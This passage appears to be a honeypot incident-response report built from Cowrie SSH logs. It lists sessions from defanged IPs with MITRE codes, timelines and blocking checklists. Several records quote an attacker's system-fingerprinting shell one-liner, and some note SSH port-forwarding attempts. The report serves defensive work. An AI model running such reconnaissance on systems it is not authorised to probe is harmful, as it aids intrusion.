- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56f79608c317

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 05:52 |
| **Last Seen** | 2026-08-15 05:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:52:48` | `cowrie.session.connect` |
| `2026-08-15 05:52:49` | `cowrie.client.version` |
| `2026-08-15 05:52:49` | `cowrie.client.kex` |
| `2026-08-15 05:52:50` | `cowrie.login.success` |
| `2026-08-15 05:52:51` | `cowrie.session.params` |
| `2026-08-15 05:52:51` | `cowrie.command.input` |
| `2026-08-15 05:52:51` | `cowrie.command.input` |
| `2026-08-15 05:52:51` | `cowrie.command.input` |
| `2026-08-15 05:52:51` | `cowrie.command.input` |
| `2026-08-15 05:52:51` | `cowrie.command.input` |
| `2026-08-15 05:52:51` | `cowrie.command.success` |
| `2026-08-15 05:52:51` | `cowrie.command.input` |
| `2026-08-15 05:52:51` | `cowrie.command.input` |
| `2026-08-15 05:52:51` | `cowrie.command.input` |
| `2026-08-15 05:52:51` | `cowrie.command.input` |
| `2026-08-15 05:52:52` | `cowrie.log.closed` |
| `2026-08-15 05:52:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9848d1b687f3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 05:54 |
| **Last Seen** | 2026-08-15 05:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:54:49` | `cowrie.session.connect` |
| `2026-08-15 05:54:50` | `cowrie.client.version` |
| `2026-08-15 05:54:50` | `cowrie.client.kex` |
| `2026-08-15 05:54:51` | `cowrie.login.success` |
| `2026-08-15 05:54:51` | `cowrie.session.params` |
| `2026-08-15 05:54:51` | `cowrie.command.input` |
| `2026-08-15 05:54:51` | `cowrie.command.input` |
| `2026-08-15 05:54:51` | `cowrie.command.input` |
| `2026-08-15 05:54:51` | `cowrie.command.input` |
| `2026-08-15 05:54:51` | `cowrie.command.input` |
| `2026-08-15 05:54:51` | `cowrie.command.success` |
| `2026-08-15 05:54:51` | `cowrie.command.input` |
| `2026-08-15 05:54:51` | `cowrie.command.input` |
| `2026-08-15 05:54:51` | `cowrie.command.input` |
| `2026-08-15 05:54:51` | `cowrie.command.input` |
| `2026-08-15 05:54:52` | `cowrie.log.closed` |
| `2026-08-15 05:54:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f1feca57146

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-15 05:55 |
| **Last Seen** | 2026-08-15 05:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:55:51` | `cowrie.session.connect` |
| `2026-08-15 05:55:51` | `cowrie.client.version` |
| `2026-08-15 05:55:51` | `cowrie.client.kex` |
| `2026-08-15 05:55:52` | `cowrie.login.success` |
| `2026-08-15 05:55:52` | `cowrie.direct-tcpip.request` |
| `2026-08-15 05:55:52` | `cowrie.direct-tcpip.data` |
| `2026-08-15 05:55:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6356e47367b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 05:56 |
| **Last Seen** | 2026-08-15 05:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:56:55` | `cowrie.session.connect` |
| `2026-08-15 05:56:55` | `cowrie.client.version` |
| `2026-08-15 05:56:55` | `cowrie.client.kex` |
| `2026-08-15 05:56:57` | `cowrie.login.success` |
| `2026-08-15 05:56:58` | `cowrie.session.params` |
| `2026-08-15 05:56:58` | `cowrie.command.input` |
| `2026-08-15 05:56:58` | `cowrie.command.input` |
| `2026-08-15 05:56:58` | `cowrie.command.input` |
| `2026-08-15 05:56:58` | `cowrie.command.input` |
| `2026-08-15 05:56:58` | `cowrie.command.input` |
| `2026-08-15 05:56:58` | `cowrie.command.success` |
| `2026-08-15 05:56:58` | `cowrie.command.input` |
| `2026-08-15 05:56:58` | `cowrie.command.input` |
| `2026-08-15 05:56:58` | `cowrie.command.input` |
| `2026-08-15 05:56:58` | `cowrie.command.input` |
| `2026-08-15 05:56:59` | `cowrie.log.closed` |
| `2026-08-15 05:56:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92dbb7cf2100

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 05:58 |
| **Last Seen** | 2026-08-15 05:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 05:58:59` | `cowrie.session.connect` |
| `2026-08-15 05:58:59` | `cowrie.client.version` |
| `2026-08-15 05:59:00` | `cowrie.client.kex` |
| `2026-08-15 05:59:00` | `cowrie.login.success` |
| `2026-08-15 05:59:02` | `cowrie.session.params` |
| `2026-08-15 05:59:02` | `cowrie.command.input` |
| `2026-08-15 05:59:02` | `cowrie.command.input` |
| `2026-08-15 05:59:02` | `cowrie.command.input` |
| `2026-08-15 05:59:02` | `cowrie.command.input` |
| `2026-08-15 05:59:02` | `cowrie.command.input` |
| `2026-08-15 05:59:02` | `cowrie.command.success` |
| `2026-08-15 05:59:02` | `cowrie.command.input` |
| `2026-08-15 05:59:02` | `cowrie.command.input` |
| `2026-08-15 05:59:02` | `cowrie.command.input` |
| `2026-08-15 05:59:02` | `cowrie.command.input` |
| `2026-08-15 05:59:02` | `cowrie.log.closed` |
| `2026-08-15 05:59:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-701e40264ec7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 06:00 |
| **Last Seen** | 2026-08-15 06:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:00:59` | `cowrie.session.connect` |
| `2026-08-15 06:00:59` | `cowrie.client.version` |
| `2026-08-15 06:00:59` | `cowrie.client.kex` |
| `2026-08-15 06:01:01` | `cowrie.login.success` |
| `2026-08-15 06:01:02` | `cowrie.session.params` |
| `2026-08-15 06:01:02` | `cowrie.command.input` |
| `2026-08-15 06:01:02` | `cowrie.command.input` |
| `2026-08-15 06:01:02` | `cowrie.command.input` |
| `2026-08-15 06:01:02` | `cowrie.command.input` |
| `2026-08-15 06:01:02` | `cowrie.command.input` |
| `2026-08-15 06:01:02` | `cowrie.command.success` |
| `2026-08-15 06:01:02` | `cowrie.command.input` |
| `2026-08-15 06:01:02` | `cowrie.command.input` |
| `2026-08-15 06:01:02` | `cowrie.command.input` |
| `2026-08-15 06:01:02` | `cowrie.command.input` |
| `2026-08-15 06:01:02` | `cowrie.log.closed` |
| `2026-08-15 06:01:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a56c39601c6f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 06:02 |
| **Last Seen** | 2026-08-15 06:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:02:49` | `cowrie.session.connect` |
| `2026-08-15 06:02:50` | `cowrie.client.version` |
| `2026-08-15 06:02:50` | `cowrie.client.kex` |
| `2026-08-15 06:02:52` | `cowrie.login.success` |
| `2026-08-15 06:02:53` | `cowrie.session.params` |
| `2026-08-15 06:02:53` | `cowrie.command.input` |
| `2026-08-15 06:02:53` | `cowrie.command.input` |
| `2026-08-15 06:02:53` | `cowrie.command.input` |
| `2026-08-15 06:02:53` | `cowrie.command.input` |
| `2026-08-15 06:02:53` | `cowrie.command.input` |
| `2026-08-15 06:02:53` | `cowrie.command.success` |
| `2026-08-15 06:02:53` | `cowrie.command.input` |
| `2026-08-15 06:02:53` | `cowrie.command.input` |
| `2026-08-15 06:02:53` | `cowrie.command.input` |
| `2026-08-15 06:02:53` | `cowrie.command.input` |
| `2026-08-15 06:02:54` | `cowrie.log.closed` |
| `2026-08-15 06:02:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f38ab3d9a4a

| Field | Detail |
|---|---|
| **Source IP** | `203.75.170[.]63` |
| **First Seen** | 2026-08-15 06:03 |
| **Last Seen** | 2026-08-15 06:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:03:54` | `cowrie.session.connect` |
| `2026-08-15 06:03:55` | `cowrie.client.version` |
| `2026-08-15 06:03:55` | `cowrie.client.kex` |
| `2026-08-15 06:03:58` | `cowrie.login.success` |
| `2026-08-15 06:03:59` | `cowrie.direct-tcpip.request` |
| `2026-08-15 06:04:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.75.170[.]63` to AbuseIPDB if not already reported
- [ ] Block `203.75.170[.]63` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1f942e59522

| Field | Detail |
|---|---|
| **Source IP** | `122.170.99[.]195` |
| **First Seen** | 2026-08-15 06:04 |
| **Last Seen** | 2026-08-15 06:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:04:04` | `cowrie.session.connect` |
| `2026-08-15 06:04:05` | `cowrie.client.version` |
| `2026-08-15 06:04:05` | `cowrie.client.kex` |
| `2026-08-15 06:04:07` | `cowrie.login.success` |
| `2026-08-15 06:04:07` | `cowrie.direct-tcpip.request` |
| `2026-08-15 06:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.170.99[.]195` to AbuseIPDB if not already reported
- [ ] Block `122.170.99[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-459a49098c20

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 06:04 |
| **Last Seen** | 2026-08-15 06:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:04:38` | `cowrie.session.connect` |
| `2026-08-15 06:04:39` | `cowrie.client.version` |
| `2026-08-15 06:04:39` | `cowrie.client.kex` |
| `2026-08-15 06:04:40` | `cowrie.login.success` |
| `2026-08-15 06:04:42` | `cowrie.session.params` |
| `2026-08-15 06:04:42` | `cowrie.command.input` |
| `2026-08-15 06:04:42` | `cowrie.command.input` |
| `2026-08-15 06:04:42` | `cowrie.command.input` |
| `2026-08-15 06:04:42` | `cowrie.command.input` |
| `2026-08-15 06:04:42` | `cowrie.command.input` |
| `2026-08-15 06:04:42` | `cowrie.command.success` |
| `2026-08-15 06:04:42` | `cowrie.command.input` |
| `2026-08-15 06:04:42` | `cowrie.command.input` |
| `2026-08-15 06:04:42` | `cowrie.command.input` |
| `2026-08-15 06:04:42` | `cowrie.command.input` |
| `2026-08-15 06:04:42` | `cowrie.log.closed` |
| `2026-08-15 06:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e51b1720ed7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 06:06 |
| **Last Seen** | 2026-08-15 06:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:06:29` | `cowrie.session.connect` |
| `2026-08-15 06:06:29` | `cowrie.client.version` |
| `2026-08-15 06:06:29` | `cowrie.client.kex` |
| `2026-08-15 06:06:30` | `cowrie.login.success` |
| `2026-08-15 06:06:32` | `cowrie.session.params` |
| `2026-08-15 06:06:32` | `cowrie.command.input` |
| `2026-08-15 06:06:32` | `cowrie.command.input` |
| `2026-08-15 06:06:32` | `cowrie.command.input` |
| `2026-08-15 06:06:32` | `cowrie.command.input` |
| `2026-08-15 06:06:32` | `cowrie.command.input` |
| `2026-08-15 06:06:32` | `cowrie.command.success` |
| `2026-08-15 06:06:32` | `cowrie.command.input` |
| `2026-08-15 06:06:32` | `cowrie.command.input` |
| `2026-08-15 06:06:32` | `cowrie.command.input` |
| `2026-08-15 06:06:32` | `cowrie.command.input` |
| `2026-08-15 06:06:33` | `cowrie.log.closed` |
| `2026-08-15 06:06:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65b8f8b0cece

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-15 06:06 |
| **Last Seen** | 2026-08-15 06:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:06:44` | `cowrie.session.connect` |
| `2026-08-15 06:06:44` | `cowrie.client.version` |
| `2026-08-15 06:06:44` | `cowrie.client.kex` |
| `2026-08-15 06:06:45` | `cowrie.login.success` |
| `2026-08-15 06:06:46` | `cowrie.session.params` |
| `2026-08-15 06:06:46` | `cowrie.command.input` |
| `2026-08-15 06:06:46` | `cowrie.log.closed` |
| `2026-08-15 06:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d832eba9b36

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-15 06:08 |
| **Last Seen** | 2026-08-15 06:09 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:08:13` | `cowrie.session.connect` |
| `2026-08-15 06:08:20` | `cowrie.client.version` |
| `2026-08-15 06:08:20` | `cowrie.client.kex` |
| `2026-08-15 06:08:42` | `cowrie.login.success` |
| `2026-08-15 06:08:55` | `cowrie.session.params` |
| `2026-08-15 06:08:55` | `cowrie.command.input` |
| `2026-08-15 06:09:00` | `cowrie.log.closed` |
| `2026-08-15 06:09:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-444f6a992417

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 06:08 |
| **Last Seen** | 2026-08-15 06:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:08:26` | `cowrie.session.connect` |
| `2026-08-15 06:08:26` | `cowrie.client.version` |
| `2026-08-15 06:08:26` | `cowrie.client.kex` |
| `2026-08-15 06:08:27` | `cowrie.login.success` |
| `2026-08-15 06:08:28` | `cowrie.session.params` |
| `2026-08-15 06:08:28` | `cowrie.command.input` |
| `2026-08-15 06:08:28` | `cowrie.command.input` |
| `2026-08-15 06:08:28` | `cowrie.command.input` |
| `2026-08-15 06:08:28` | `cowrie.command.input` |
| `2026-08-15 06:08:28` | `cowrie.command.input` |
| `2026-08-15 06:08:28` | `cowrie.command.success` |
| `2026-08-15 06:08:28` | `cowrie.command.input` |
| `2026-08-15 06:08:28` | `cowrie.command.input` |
| `2026-08-15 06:08:28` | `cowrie.command.input` |
| `2026-08-15 06:08:28` | `cowrie.command.input` |
| `2026-08-15 06:08:28` | `cowrie.log.closed` |
| `2026-08-15 06:08:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-686451a0f5f6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-15 06:10 |
| **Last Seen** | 2026-08-15 06:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-15 06:10:26` | `cowrie.session.connect` |
| `2026-08-15 06:10:26` | `cowrie.client.version` |
| `2026-08-15 06:10:26` | `cowrie.client.kex` |
| `2026-08-15 06:10:27` | `cowrie.login.success` |
| `2026-08-15 06:10:28` | `cowrie.session.params` |
| `2026-08-15 06:10:28` | `cowrie.command.input` |
| `2026-08-15 06:10:28` | `cowrie.command.input` |
| `2026-08-15 06:10:28` | `cowrie.command.input` |
